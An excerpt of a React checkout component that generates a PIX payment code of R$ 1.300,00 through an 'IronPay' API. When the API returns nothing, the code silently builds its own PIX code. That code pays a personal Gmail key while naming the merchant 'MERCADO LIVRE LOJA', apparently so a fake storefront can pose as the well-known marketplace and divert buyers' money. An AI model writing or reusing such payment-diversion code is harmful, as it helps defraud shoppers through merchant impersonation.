...
export function Checkout({
  ...
  const gerarPixIronPay = async (dados = f) => {
    ...
    try {
      const payload = {
        amount: IRONPAY_CONFIG.amount, // 130000 = R$ 1.300,00
    ...
    // If IronPay API fails to return a code, generate valid PIX EMV code for R$ 1.300,00
    if (!code) {
      const txId = 'ML' + Date.now().toString(36).toUpperCase().slice(-8);
      code = buildPixEMV('samuelcab444@gmail.com', 'MERCADO LIVRE LOJA', 'MIRASSOL', 1300.00, txId);
    }

    setPixCode(code);
    toast.success("QR Code Pix de R$ 1.300,00 gerado!");
    setPixLoading(false);
  };
